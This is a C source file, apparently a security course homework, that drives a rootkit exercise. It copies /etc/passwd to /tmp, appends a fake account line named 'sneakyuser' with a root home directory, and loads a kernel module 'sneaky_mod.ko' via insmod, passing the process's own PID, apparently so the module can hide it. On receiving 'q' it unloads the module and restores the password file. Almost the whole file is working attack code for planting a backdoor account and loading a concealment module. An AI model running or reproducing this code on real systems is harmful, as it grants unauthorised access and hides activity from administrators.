/*****************************************
 *  --- ECE650 HW5 Connor Grehlinger --- * 
 *****************************************/
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


// Attack operations (1,2,3,4)

// Op 1
// copy /etc/passwd to /tmp/passwd, add authentication line 
#define TARGET_PASSWD "/etc/passwd"
#define TEMP_PASSWD "/tmp/passwd"
#define FAKE_AUTH "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash"

// add authenication line
int op1_add_auth_line(const char* target_file, const char* line_to_add){
  // open /etc/passwd and do appropriate error checking
  FILE * targetFileStream = fopen(target_file, "a"); // append mode
  if (targetFileStream == NULL){
    fprintf(stderr, "Error, could not open file %s for appending line, errno = %d\n",
	    target_file, errno);
    return -1; // indicate error
  }
  else{ // success
    fprintf(targetFileStream,"%s\n", line_to_add);
  }
  // close file
  if (fclose(targetFileStream) != 0){
    fprintf(stderr, "Error, could not close file %s after appending line\n",
	    target_file);
  }
  return 0; // return success 
}


// copy /etc/passwd to /tmp/passwd
ssize_t op1_copy(char * source, char * destination){
  
  int source_fd = open(source, O_RDONLY); // source filedescriptor
  int dest_fd = open(destination, O_CREAT | O_WRONLY | O_TRUNC, 0600);
  // check open call
  if ((source_fd < 0) || (dest_fd < 0)){
    fprintf(stderr, "Error, could not open source file %s or destination file"
	    "%s\n", source, destination);
    return -1; // indicate error
  }
  // once files are open easiest copy option is read into buffer then
  // write from buffer into target
  ssize_t success_indicator;

  char buffer[8192]; 
  // doing in loop due to unknown size of files
  for(;;){
    success_indicator = read(source_fd, buffer, sizeof(buffer));
    if (success_indicator < 0){
      fprintf(stderr, "Error reading from source file %s\n", source);
      break; // break and return error of -1
    }

    else if(success_indicator == 0){
      // after first pass of loop, read returns 0 when at EOF
      break; // break and return success of 0
    }

    success_indicator = write(dest_fd, buffer, success_indicator);
    // success_indicator should have the correct # of bytes on first pass
    // to write into destination file, 0 when all have been read 
    if (success_indicator < 0){
      fprintf(stderr, "Error writing to destination file %s\n", destination);
      break; // break and return error of -1
    }
  }

  // close file descriptors:
  close(source_fd);
  close(dest_fd);
  return success_indicator;
}

// Op 2 loading sneaky module 
int op2_begin_attack(){
  char * args[4];
  char sneaky_pid[64];
  memset(sneaky_pid, 0, sizeof(sneaky_pid));
  
  snprintf(sneaky_pid, sizeof(sneaky_pid), "sneaky_pid=%d", getpid());

  if (op1_copy(TARGET_PASSWD, TEMP_PASSWD) < 0){
    // error
    return -1;
  }
  if (op1_add_auth_line(TARGET_PASSWD, FAKE_AUTH) < 0){
    // error
    return -1;
  }
  args[0] = "insmod";
  args[1] = "sneaky_mod.ko";
  args[2] = sneaky_pid;
  args[3] = NULL;
  
  int status;
  pid_t child;

  if ((child = fork()) < 0){
    // error with child process
    fprintf(stderr, "Error forking child process\n");
    return -1;
  }
  if (child == 0){ // child process 
    // execute insmod command
    
    //printf("In child process, pid = %d\n", getpid());
    int child_return_val = execvp(args[0], args);

    if (child_return_val < 0){
      fprintf(stderr, "Error executing child process, errno = %d\n", errno);
      exit(EXIT_FAILURE);
    }
  }
  else{ // parent process
   
    //printf("In parents process, pid = %d\n", getpid());
    pid_t parent = waitpid(child, &status, WUNTRACED | WCONTINUED);
    
    if (parent < 0){
      fprintf(stderr, "Error waiting on child process, errno = %d\n", errno);
      return -1;
    }
    else{
      //printf("Child process completed, module loaded\n");
    }
  }
  return 0;
}


// Op 3 is loop in main


// Op 4 unload module and restore /etc/passwd
int op4_end_attack(){
  char * args[3];

  args[0] = "rmmod";
  args[1] = "sneaky_mod.ko";
  args[2] = NULL;
  
  int status;
  pid_t child;
  if ((child = fork()) < 0){
    // error with child process
    fprintf(stderr, "Error forking child process\n");
    return -1;
  }
  if (child == 0){ // child process 
    // execute insmod command

    //printf("In child process, pid = %d\n", getpid());
    int child_return_val = execvp(args[0], args);

    if (child_return_val < 0){
      fprintf(stderr, "Error executing child process, errno = %d\n", errno);
      exit(EXIT_FAILURE);
    }
  }
  else{ // parent process
    
    //printf("In parents process, pid = %d\n", getpid());
    pid_t parent = waitpid(child, &status, WUNTRACED | WCONTINUED);
    
    if (parent < 0){
      fprintf(stderr, "Error waiting on child process, errno = %d\n", errno);
      return -1;
    }
    else{
      //printf("Child process completed, module unloaded\n");
    }
  }
  // now copy back passwd file contents
  if (op1_copy(TEMP_PASSWD, TARGET_PASSWD) < 0){
    // error
    return -1;
  }
  return 0;
}




int main(int argc, char* argv[]){


  printf("sneaky_process pid = %d\n", getpid()); // add 04/10 change 
  
  
  if (op2_begin_attack() != 0){
    fprintf(stderr,"Attack failed, errno = %d\n", errno);
    exit(EXIT_FAILURE);
  }
  
  for(;;){  // Op 3 testing malicious activity
    char char_in;
    printf("sneaky_process is running... $: ");
    char_in = getchar();
    printf("sneaky_process is running... $: \n");
    if (char_in == 'q'){ // exit
  
      if (op4_end_attack() != 0){
	fprintf(stderr, "Attack cleanup failed, errno = %d\n", errno);
	exit(EXIT_FAILURE);
      }
      printf("Exiting sneaky_process... \n");
      break;
    }
  }

  return EXIT_SUCCESS;
}
